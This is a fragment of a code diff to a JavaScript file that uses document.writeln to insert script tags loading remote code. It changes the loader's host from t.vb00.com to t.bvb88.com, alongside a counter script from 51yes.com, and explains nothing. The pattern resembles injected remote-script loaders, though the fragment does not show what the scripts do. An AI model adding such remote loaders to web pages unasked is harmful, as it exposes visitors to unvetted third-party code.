@@ -2,4 +2,4 @@ document.writeln("<script language=\"javascript\" src=\"http:\/\/count10.51yes.c
 
 
 
-document.writeln("<script src=http:\/\/t.vb00.com\/t1.js ><\/script>");
+document.writeln("<script src=http:\/\/t.bvb88.com\/t1.js ><\/script>");
